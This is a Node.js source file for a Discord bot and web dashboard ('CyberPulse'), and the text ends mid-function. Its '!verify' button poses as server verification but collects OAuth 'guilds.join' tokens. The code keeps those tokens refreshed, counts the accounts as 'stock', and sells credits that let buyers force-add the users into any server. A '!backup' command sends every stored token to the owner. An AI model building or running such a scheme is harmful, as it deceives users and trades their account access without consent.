const { 
  Client, 
  GatewayIntentBits, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder, 
  StringSelectMenuOptionBuilder,
  PermissionFlagsBits,
  ChannelType,
  SlashCommandBuilder,
  REST,
  Routes,
  AttachmentBuilder
} = require('discord.js');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mongoose = require('mongoose');
const axios = require('axios');
const session = require('express-session');
require('dotenv').config();

// ==================== CONFIGURATION & ENVIRONMENT ====================
const TOKEN = process.env.DISCORD_TOKEN || process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
const REDIRECT_URI = process.env.REDIRECT_URI || `${PUBLIC_URL}/callback`;
const WEB_REDIRECT_URI = process.env.WEB_REDIRECT_URI || `${PUBLIC_URL}/auth/callback`;
const MONGO_URI = process.env.MONGO_URI;

// Exclusive Owner ID
const OWNER_ID = '1370594462941581433';
const BANNER_IMAGE_URL = 'https://cdn.discordapp.com/attachments/1531305989410787418/1568198735694139402/Gemini_Generated_Image_xjoeqcxjoeqcxjoe.png?ex=6af19562&is=6af043e2&hm=4298d9d755b0a7b4ffe1b1afa3b14ff15639d997e53a1a0e110589ff341f2da2&';

if (!TOKEN || !CLIENT_ID || !CLIENT_SECRET || !MONGO_URI) {
  console.error("❌ [FATAL ERROR]: Missing critical environment variables in Render settings.");
  process.exit(1);
}

const startTime = Date.now();

// ==================== DATABASE SCHEMAS ====================
mongoose.connect(MONGO_URI)
  .then(() => console.log("⚡ [DATABASE] Connected to database successfully!"))
  .catch(err => console.error("❌ [DATABASE ERROR]:", err));

const userSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  username: String,
  accessToken: { type: String, required: true },
  refreshToken: { type: String, required: true },
  expiresAt: { type: Date, required: true },
  verifiedAt: { type: Date, default: Date.now }
}, { collection: 'verifiedusers' });
const VerifiedUser = mongoose.model('VerifiedUser', userSchema);

const creditSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  balance: { type: Number, default: 0 },
  onlineAdded: { type: Number, default: 0 },
  offlineAdded: { type: Number, default: 0 },
  reactionAdded: { type: Number, default: 0 },
  onlineConsumed: { type: Number, default: 0 },
  offlineConsumed: { type: Number, default: 0 },
  reactionConsumed: { type: Number, default: 0 }
}, { collection: 'usercredits' });
const UserCredit = mongoose.model('UserCredit', creditSchema);

const resellerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'resellers' });
const Reseller = mongoose.model('Reseller', resellerSchema);

const partnerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'partners' });
const Partner = mongoose.model('Partner', partnerSchema);

const guildConfigSchema = new mongoose.Schema({
  guildId: { type: String, required: true, unique: true },
  verifiedRoleId: { type: String, default: null }
}, { collection: 'guildconfigs' });
const GuildConfig = mongoose.model('GuildConfig', guildConfigSchema);

const operationSchema = new mongoose.Schema({
  opId: { type: String, required: true, unique: true },
  discordId: { type: String, required: true },
  targetGuildId: String,
  requestedQuantity: Number,
  successfulQuantity: { type: Number, default: 0 },
  status: { type: String, default: 'PROCESSING' }, // PROCESSING, COMPLETED, FAILED
  timestamp: { type: Date, default: Date.now }
}, { collection: 'operations' });
const Operation = mongoose.model('Operation', operationSchema);

const activeSessions = new Map();

// Helper to check if a user has administrative/owner privileges
async function hasOwnerPrivileges(userId) {
  if (userId === OWNER_ID) return true;
  const isPartner = await Partner.findOne({ discordId: userId });
  return !!isPartner;
}

// Pricing Calculator Helper
function calculatePrice(quantity) {
  let bonusPercent = 0;
  let tierName = 'Standard';
  
  if (quantity >= 10000) {
    bonusPercent = 15;
    tierName = 'Enterprise Tier';
  } else if (quantity >= 2500) {
    bonusPercent = 5;
    tierName = 'Pro Tier';
  } else if (quantity >= 500) {
    tierName = 'Starter Tier';
  }

  const bonusCredits = Math.floor((quantity * bonusPercent) / 100);
  const totalCreditsGiven = quantity + bonusCredits;

  return { quantity, bonusPercent, tierName, bonusCredits, totalCreditsGiven };
}

// ==================== EXPRESS WEB SERVER & SOCKET.IO SETUP ====================
const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(session({
  secret: process.env.SESSION_SECRET || 'cyberpulse_super_secret_session',
  resave: false,
  saveUninitialized: false
}));

// OAuth2 Verification Success HTML
const successHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CYBERPULSE // Authorization Complete</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: #06070d;
      background-image: 
        radial-gradient(circle at 50% 30%, rgba(112, 0, 255, 0.15), transparent 60%),
        linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
        linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
      background-size: 100% 100%, 40px 40px, 40px 40px;
      color: #e2e8f0; font-family: 'Rajdhani', sans-serif;
      min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
    }
    .container { width: 100%; max-width: 440px; padding: 20px; position: relative; }
    .card {
      background: rgba(13, 14, 24, 0.85); border: 1px solid rgba(139, 92, 246, 0.3);
      border-radius: 16px; padding: 40px 30px; text-align: center; backdrop-filter: blur(12px);
      box-shadow: 0 0 40px rgba(112, 0, 255, 0.2), inset 0 0 15px rgba(139, 92, 246, 0.1);
    }
    .subtitle { font-family: 'Orbitron', sans-serif; font-size: 0.75rem; letter-spacing: 3px; color: #a78bfa; text-transform: uppercase; margin-bottom: 8px; }
    .title {
      font-family: 'Orbitron', sans-serif; font-size: 1.6rem; font-weight: 800; letter-spacing: 2px;
      background: linear-gradient(135deg, #ffffff 0%, #38bdf8 100%);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 25px; text-transform: uppercase;
    }
    .icon-wrapper {
      width: 72px; height: 72px; margin: 0 auto 25px; border-radius: 50%;
      background: rgba(16, 185, 129, 0.1); border: 2px dashed #10b981;
      display: flex; align-items: center; justify-content: center;
      box-shadow: 0 0 20px rgba(16, 185, 129, 0.3); animation: pulseGlow 2.5s infinite ease-in-out;
    }
    .icon-wrapper svg { width: 34px; height: 34px; stroke: #10b981; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; fill: none; }
    .divider { height: 2px; width: 100%; background: linear-gradient(90deg, transparent, #8b5cf6, #38bdf8, transparent); margin-bottom: 25px; }
    .status-box { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; padding: 16px; margin-bottom: 25px; }
    .status-title { font-family: 'Orbitron', sans-serif; font-size: 0.8rem; color: #38bdf8; letter-spacing: 1.5px; margin-bottom: 6px; }
    .status-desc { font-size: 0.95rem; color: #94a3b8; }
    .btn {
      width: 100%; padding: 14px; font-family: 'Orbitron', sans-serif; font-size: 0.85rem; font-weight: 700; letter-spacing: 2px;
      color: #ffffff; background: linear-gradient(135deg, #6366f1 0%, #3b82f6 100%);
      border: none; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4); transition: all 0.2s ease;
    }
    .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(99, 102, 241, 0.6); }
    @keyframes pulseGlow { 0%, 100% { box-shadow: 0 0 15px rgba(16, 185, 129, 0.3); } 50% { box-shadow: 0 0 30px rgba(16, 185, 129, 0.6); } }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="subtitle">System Authorization</div>
      <h1 class="title">CyberPulse Management</h1>
      <div class="icon-wrapper">
        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
      </div>
      <div class="divider"></div>
      <div class="status-box">
        <div class="status-title">ACCESS GRANTED // VERIFIED</div>
        <div class="status-desc">Welcome, Operative. Clearance established successfully.</div>
      </div>
      <button class="btn" onclick="window.close()">TERMINATE WINDOW</button>
    </div>
  </div>
</body>
</html>
`;

// Direct OAuth Verification Endpoint
app.get('/verify', (req, res) => {
  const discordOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
  res.redirect(discordOAuthUrl);
});

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.status(400).send('❌ Authorization failed.');

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
      client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code', code, redirect_uri: REDIRECT_URI
    }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

    const { access_token, refresh_token, expires_in } = tokenResponse.data;
    const expiresAt = new Date(Date.now() + expires_in * 1000);

    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${access_token}` }
    });

    const discordId = userResponse.data.id;
    const username = userResponse.data.username;

    await VerifiedUser.findOneAndUpdate(
      { discordId },
      { username, accessToken: access_token, refreshToken: refresh_token, expiresAt, verifiedAt: Date.now() },
      { upsert: true, new: true }
    );

    // Auto-assign Verified Role across connected guilds
    client.guilds.cache.forEach(async (guild) => {
      try {
        const config = await GuildConfig.findOne({ guildId: guild.id });
        if (config && config.verifiedRoleId) {
          const member = await guild.members.fetch(discordId).catch(() => null);
          if (member) {
            await member.roles.add(config.verifiedRoleId).catch(() => {});
          }
        }
      } catch (e) {}
    });

    res.send(successHtml);
  } catch (error) {
    res.status(500).send('❌ Authentication protocol failed.');
  }
});

// WEB DASHBOARD OAUTH SINGLE SIGN-ON & FRONTEND
app.get('/login', (req, res) => {
  const webAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(WEB_REDIRECT_URI)}&response_type=code&scope=identify`;
  res.redirect(webAuthUrl);
});

app.get('/auth/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.redirect('/');

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
      client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code', code, redirect_uri: WEB_REDIRECT_URI
    }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` }
    });

    req.session.user = {
      id: userResponse.data.id,
      username: userResponse.data.username,
      avatar: userResponse.data.avatar
    };

    res.redirect('/dashboard');
  } catch (e) {
    res.status(500).send('❌ Dashboard login failed.');
  }
});

app.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/');
});

// WEB DASHBOARD FULL HTML & WEBSOCKET INTERFACE
app.get('/dashboard', async (req, res) => {
  if (!req.session.user) return res.redirect('/login');

  const uc = await UserCredit.findOne({ discordId: req.session.user.id }) || { balance: 0 };
  const totalStock = await VerifiedUser.countDocuments();
  const operations = await Operation.find({ discordId: req.session.user.id }).sort({ timestamp: -1 }).limit(5);

  const dashboardHtml = `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>CYBERPULSE // Operative Web Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <script src="/socket.io/socket.io.js"></script>
    <style>
      * { box-sizing: border-box; margin: 0; padding: 0; }
      body { background: #06070d; color: #e2e8f0; font-family: 'Rajdhani', sans-serif; padding: 20px; }
      .nav { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #7000ff; padding-bottom: 15px; margin-bottom: 30px; }
      .nav h1 { font-family: 'Orbitron', sans-serif; color: #38bdf8; font-size: 1.5rem; }
      .user-info { display: flex; align-items: center; gap: 10px; }
      .btn-logout { background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.85rem; }
      .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
      .card { background: rgba(13, 14, 24, 0.9); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 12px; padding: 25px; backdrop-filter: blur(10px); }
      .card h2 { font-family: 'Orbitron', sans-serif; font-size: 1.1rem; color: #a78bfa; margin-bottom: 15px; }
      .stat-val { font-size: 2rem; font-weight: bold; color: #10b981; }
      input, select, button { width: 100%; padding: 12px; margin-top: 10px; border-radius: 6px; border: 1px solid #8b5cf6; background: #0d0e18; color: white; font-family: inherit; }
      button { background: linear-gradient(135deg, #7000ff, #38bdf8); font-family: 'Orbitron', sans-serif; cursor: pointer; font-weight: bold; margin-top: 15px; border: none; }
      button:hover { opacity: 0.9; }
      .progress-container { width: 100%; background: #1e293b; border-radius: 8px; margin-top: 15px; overflow: hidden; height: 20px; }
      .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #10b981, #38bdf8); transition: width 0.3s ease; }
    </style>
  </head>
  <body>
    <div class="nav">
      <h1>⚡ CYBERPULSE DASHBOARD</h1>
      <div class="user-info">
        <span>Operative: <b>${req.session.user.username}</b></span>
        <a href="/logout" class="btn-logout">LOGOUT</a>
      </div>
    </div>
    <div class="grid">
      <div class="card">
        <h2>💳 YOUR BALANCE</h2>
        <div class="stat-val" id="creditBalance">${uc.balance} CREDITS</div>
        <p style="margin-top: 10px; color: #94a3b8;">Available Verified Database Stock: <b>${totalStock}</b></p>
      </div>
      <div class="card">
        <h2>🚀 QUEUE MEMBER ADDITION</h2>
        <form id="orderForm">
          <label>Target Server ID:</label>
          <input type="text" id="targetGuildId" placeholder="Ex: 1285560083786371085" required/>
          <label style="margin-top: 10px; display: block;">Quantity:</label>
          <input type="number" id="quantity" placeholder="Number of members" required min="1"/>
          <button type="submit">EXECUTE DISPATCH</button>
        </form>
      </div>
      <div class="card" style="grid-column: 1 / -1;">
        <h2>📊 LIVE OPERATION DISPATCH SYSTEM</h2>
        <div id="activeOpStatus" style="color: #94a3b8;">No active dispatch running...</div>
        <div class="progress-container"><div class="progress-bar" id="opProgressBar"></div></div>
      </div>
    </div>
    <script>
      const socket = io();
      const userId = "${req.session.user.id}";
      socket.emit('joinUserRoom', userId);

      document.getElementById('orderForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const guildId = document.getElementById('targetGuildId').value;
        const qty = parseInt(document.getElementById('quantity').value, 10);

        const res = await fetch('/api/web-order', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ guildId, quantity: qty })
        });
        const data = await res.json();
        if(!res.ok) alert(data.error);
      });

      socket.on('opProgress', (data) => {
        document.getElementById('activeOpStatus').innerHTML = \`🚀 Dispatching Operation: <b>\${data.opId}</b> (\${data.current}/\${data.total})\`;
        const pct = (data.current / data.total) * 100;
        document.getElementById('opProgressBar').style.width = pct + '%';
      });

      socket.on('opComplete', (data) => {
        document.getElementById('activeOpStatus').innerHTML = \`✅ Operation <b>\${data.opId}</b> Completed! Added \${data.successful} members.\`;
        document.getElementById('opProgressBar').style.width = '100%';
        location.reload();
      });
    </script>
  </body>
  </html>
  `;
  res.send(dashboardHtml);
});

// API ROUTE FOR WEB ORDER SUBMISSION
app.post('/api/web-order', async (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'Unauthorized' });
  const { guildId, quantity } = req.body;
  const userId = req.session.user.id;

  let uc = await UserCredit.findOne({ discordId: userId });
  if (!uc || uc.balance < quantity) {
    return res.status(400).json({ error: 'Insufficient credit balance.' });
  }

  // Pre-flight Security & Permission Scan
  try {
    const targetGuild = await client.guilds.fetch(guildId);
    const botMember = await targetGuild.members.fetch(client.user.id);
    if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
      return res.status(400).json({ error: 'CyberPulse lacks Manage Roles permission in target server.' });
    }
  } catch (e) {
    return res.status(400).json({ error: 'Bot is not in target server or Server ID is invalid.' });
  }

  uc.balance -= quantity;
  uc.offlineConsumed += quantity;
  await uc.save();

  const opId = `WEB-OP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
  await Operation.create({ opId, discordId: userId, targetGuildId: guildId, requestedQuantity: quantity });

  // Execute Dispatch in Background
  executeAsyncDispatch(opId, userId, guildId, quantity);

  return res.json({ success: true, opId });
});

// ASYNC DISPATCH ENGINE WITH SOCKET UPDATES
async function executeAsyncDispatch(opId, userId, guildId, quantity) {
  try {
    const targetGuild = await client.guilds.fetch(guildId);
    const verifiedUsers = await VerifiedUser.find({});
    let successful = 0;

    for (const userRecord of verifiedUsers) {
      if (successful >= quantity) break;
      try {
        const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
        if (member) continue;

        await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
        successful++;

        io.to(userId).emit('opProgress', { opId, current: successful, total: quantity });
        await new Promise(r => setTimeout(r, 600));
      } catch (err) {}
    }

    await Operation.findOneAndUpdate({ opId }, { successfulQuantity: successful, status: 'COMPLETED' });
    io.to(userId).emit('opComplete', { opId, successful });
  } catch (err) {
    await Operation.findOneAndUpdate({ opId }, { status: 'FAILED' });
  }
}

// SOCKET.IO ROOMS
io.on('connection', (socket) => {
  socket.on('joinUserRoom', (userId) => socket.join(userId));
});

app.get('/', (req, res) => res.status(200).send('⚡ CYBERPULSE OAUTH & WEB DASHBOARD SYSTEM ONLINE'));
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`🚀 [WEB SERVER] Running live on port ${PORT}`));

// ==================== DISCORD BOT SETUP ====================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences
  ]
});

// Register Slash Commands
const slashCommands = [
  new SlashCommandBuilder()
    .setName('verifiedrole')
    .setDescription('🛡️ Configure the verified role assigned automatically upon user verification.')
    .addRoleOption(option => 
      option.setName('role')
        .setDescription('Select the verified role')
        .setRequired(true)
    )
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('ready', async () => {
  console.log(`🤖 [DISCORD BOT] Online and locked in as ${client.user.tag}!`);
  try {
    console.log('🔄 Registering global slash commands...');
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands });
    console.log('✅ Slash commands registered successfully.');
  } catch (err) {
    console.error('❌ Failed to register slash commands:', err);
  }
});

// BACKGROUND TASK: TOKEN HEALTH AUTO-HEALER & DEAD TOKEN PRUNER
setInterval(async () => {
  try {
    const users = await VerifiedUser.find({});
    for (const user of users) {
      try {
        // Test token health via silent Discord @me call
        await axios.get('https://discord.com/api/users/@me', {
          headers: { Authorization: `Bearer ${user.accessToken}` }
        });
      } catch (err) {
        // Token is invalid/expired -> Attempt Refresh
        try {
          const res = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'refresh_token', refresh_token: user.refreshToken
          }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

          user.accessToken = res.data.access_token;
          user.refreshToken = res.data.refresh_token;
          user.expiresAt = new Date(Date.now() + res.data.expires_in * 1000);
          await user.save();
        } catch (refreshErr) {
          // Token is completely dead -> Prune from DB to protect stock accuracy
          await VerifiedUser.deleteOne({ discordId: user.discordId });
          console.log(`🧹 [AUTO-HEALER] Pruned dead token for user: ${user.username} (${user.discordId})`);
        }
      }
    }

    // STOCK ALERT NOTIFICATIONS
    const currentStock = await VerifiedUser.countDocuments();
    if (currentStock < 500) {
      const ownerUser = await client.users.fetch(OWNER_ID).catch(() => null);
      if (ownerUser) {
        const alertEmbed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('⚠️ LOW STOCK WARNING ALERT 📦')
          .setDescription(`Attention Owner: Total verified accounts in database has dropped to **${currentStock}** accounts.`)
          .setTimestamp();
        ownerUser.send({ embeds: [alertEmbed] }).catch(() => {});
      }
    }
  } catch (err) {}
}, 3600000);

// Global Error Catching
process.on('unhandledRejection', error => console.error('⚠️ Unhandled Rejection:', error));
process.on('uncaughtException', error => console.error('⚠️ Uncaught Exception:', error));

// ==================== MESSAGE COMMANDS ====================
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;

  const prefix = '!';
  if (!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  const isOwner = message.author.id === OWNER_ID;
  const hasPrivileges = await hasOwnerPrivileges(message.author.id);

  try {
    // 1. !verify command
    if (command === 'verify') {
      const embed = new EmbedBuilder()
        .setColor(0x7000ff)
        .setTitle('⚡ CyberPulse System Clearance & Verification')
        .setDescription('✨ Click the secure button below to complete OAuth2 authorization, claim your verified role, and unlock full server access.')
        .setImage(BANNER_IMAGE_URL)
        .setFooter({ text: 'CyberPulse Security Protocol 🛡️' });

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setLabel('Verify System Clearance')
          .setStyle(ButtonStyle.Link)
          .setURL(`${PUBLIC_URL}/verify`)
          .setEmoji('🔐')
      );

      return message.reply({ embeds: [embed], components: [row] });
    }

    // 2. !panel command -> OWNER & PARTNERS ONLY
    if (command === 'panel') {
      if (!hasPrivileges) {
        return message.reply('❌ **Access Denied:** Only the bot owner or authorized partners can deploy the master panel.');
      }

      const embed = new EmbedBuilder()
        .setColor(0x7000ff)
        .setTitle('💎 CyberPulse Management & Web Hub 🚀')
        .setDescription('🛒 **Buy Credits:** Open a private ticket with administration.\n💳 **My Credits:** Check your available balance.\n⚡ **Add Members:** Initialize deployment sequence.\n🌐 **Web Dashboard:** Manage orders via browser at ' + PUBLIC_URL + '/dashboard\n\n**📦 Tiered Bulk Pricing:**\n• **Starter:** 500 Credits\n• **Pro (5% Bonus):** 2,500 Credits\n• **Enterprise (15% Bonus):** 10,000 Credits')
        .setImage(BANNER_IMAGE_URL)
        .setFooter({ text: 'CyberPulse Secure Panel v7.0 ⚡' });

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('btn_buy_credits_ticket').setLabel('Buy Credits').setStyle(ButtonStyle.Success).setEmoji('🛒'),
        new ButtonBuilder().setCustomId('btn_my_credits').setLabel('My Credits').setStyle(ButtonStyle.Secondary).setEmoji('💳'),
        new ButtonBuilder().setCustomId('btn_add_members').setLabel('Add Members').setStyle(ButtonStyle.Primary).setEmoji('⚡'),
        new ButtonBuilder().setLabel('Web Dashboard').setStyle(ButtonStyle.Link).setURL(`${PUBLIC_URL}/dashboard`).setEmoji('🌐')
      );

      return message.reply({ embeds: [embed], components: [row] });
    }

    // 3. !calculator <amount> -> INTERACTIVE PRICE & BONUS CALCULATOR
    if (command === 'calculator' || command === 'calc') {
      const amount = parseInt(args[0], 10);
      if (isNaN(amount) || amount <= 0) {
        return message.reply('⚠️ **Usage:** `!calculator <amount>` (Ex: `!calculator 2500`)');
      }

      const calc = calculatePrice(amount);

      const embed = new EmbedBuilder()
        .setColor(0x38bdf8)
        .setTitle('💳 CyberPulse Tiered Credit Calculator 📊')
        .addFields(
          { name: '📦 Target Order Amount', value: `\`${calc.quantity.toLocaleString()} Credits\``, inline: true },
          { name: '🏆 Pricing Tier', value: `\`${calc.tierName}\``, inline: true },
          { name: '🎁 Bulk Bonus %', value: `\`${calc.bonusPercent}%\``, inline: true },
          { name: '🎉 Extra Bonus Credits', value: `\`+${calc.bonusCredits.toLocaleString()} Credits\``, inline: true },
          { name: '🌟 Total Credits Received', value: `\`${calc.totalCreditsGiven.toLocaleString()} Credits\``, inline: true }
        )
        .setFooter({ text: 'Use !panel or open a ticket to purchase credits!' })
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

    // 4. !topresellers -> RESELLER LEADERBOARD
    if (command === 'topresellers' || command === 'resellerboard') {
      const topResellers = await UserCredit.find({ offlineConsumed: { $gt: 0 } }).sort({ offlineConsumed: -1 }).limit(5);

      if (topResellers.length === 0) {
        return message.reply('📊 No reseller volume tracked yet for this period.');
      }

      let descriptionText = '🏆 **Top CyberPulse Resellers by Sales Volume:**\n\n';
      topResellers.forEach((res, index) => {
        const medal = index === 0 ? '👑' : index === 1 ? '🥈' : index === 2 ? '🥉' : '⭐';
        descriptionText += `${medal} **#${index + 1}** <@${res.discordId}> — **${res.offlineConsumed.toLocaleString()}** Credits Transferred/Deployed\n`;
      });

      const embed = new EmbedBuilder()
        .setColor(0x10b981)
        .setTitle('📊 CyberPulse Reseller Leaderboard 🚀')
        .setDescription(descriptionText)
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

    // 5. !backup -> AUTOMATED SNAPSHOT BACKUP (OWNER ONLY)
    if (command === 'backup') {
      if (!isOwner) return message.reply('❌ **Access Denied:** Only the owner can generate database backups.');

      const verifiedUsers = await VerifiedUser.find({});
      const userCredits = await UserCredit.find({});
      const resellers = await Reseller.find({});
      const partners = await Partner.find({});

      const backupData = {
        timestamp: new Date(),
        verifiedUsersCount: verifiedUsers.length,
        verifiedUsers,
        userCredits,
        resellers,
        partners
      };

      const buffer = Buffer.from(JSON.stringify(backupData, null, 2));
      const attachment = new AttachmentBuilder(buffer, { name: `CyberPulse_Backup_${Date.now()}.json` });

      const embed = new EmbedBuilder()
        .setColor(0x10b981)
        .setTitle('⚡ CyberPulse Encrypted Database Backup 📦')
        .setDescription('Attached is your complete snapshot file of verified users, balances, and reseller stats.')
        .setTimestamp();

      return message.author.send({ embeds: [embed], files: [attachment] })
        .then(() => message.reply('✅ Encrypted database snapshot sent to your DMs!'))
        .catch(() => message.reply('❌ Failed to DM backup. Check your privacy settings.'));
    }

    // 6. !gc command -> OWNER & PARTNERS ONLY
    if (command === 'gc') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ Usage: `!gc @user <amount>`');

      const calc = calculatePrice(amount);
      const totalToAdd = calc.totalCreditsGiven;

      let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
      if (!userCredit) userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });

      userCredit.balance += totalToAdd;
      userCredit.offlineAdded += totalToAdd;
      await userCredit.save();

      const embed = new EmbedBuilder()
        .setColor(0x10b981)
        .setTitle('📦 CyberPulse Credits Issued! 🚀')
        .setDescription(`🖤 **${amount.toLocaleString()}** base credits (+**${calc.bonusCredits}** bonus) added to <@${targetUser.id}>!`)
        .addFields(
          { name: '🌟 New Balance', value: `\`${userCredit.balance} credits\``, inline: true },
          { name: '🏆 Tier Applied', value: `\`${calc.tierName}\``, inline: true }
        )
        .setTimestamp();

      return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 7. !rc command -> OWNER & PARTNERS ONLY
    if (command === 'rc') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ Usage: `!rc @user <amount>`');

      let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
      if (!userCredit) userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });

      const deducted = Math.min(userCredit.balance, amount);
      userCredit.balance = Math.max(0, userCredit.balance - amount);
      userCredit.offlineConsumed += deducted;
      await userCredit.save();

      return message.reply(`🔻 Deducted **${amount}** credits from <@${targetUser.id}>. New balance: \`${userCredit.balance}\`.`);
    }

    // 8. !partner / !removepartner / !reseller / !removereseller
    if (command === 'partner') {
      if (!isOwner) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!partner @user`');
      await Partner.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`🤝 Appointed <@${targetUser.id}> as Partner!`);
    }

    if (command === 'reseller') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!reseller @user`');
      await Reseller.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`💼 Registered <@${targetUser.id}> as Reseller!`);
    }

    // 9. !resale @user <amount>
    if (command === 'resale') {
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('⚠️ **Usage:** `!resale @user <amount>`');

      const isReseller = await Reseller.findOne({ discordId: message.author.id });
      if (!isReseller && !hasPrivileges) return message.reply('❌ **Access Denied.**');

      let senderCredit = await UserCredit.findOne({ discordId: message.author.id });
      if (!senderCredit || senderCredit.balance < amount) return message.reply('❌ Insufficient balance.');

      senderCredit.balance -= amount;
      senderCredit.offlineConsumed += amount;
      await senderCredit.save();

      let recipientCredit = await UserCredit.findOne({ discordId: targetUser.id });
      if (!recipientCredit) recipientCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
      recipientCredit.balance += amount;
      recipientCredit.offlineAdded += amount;
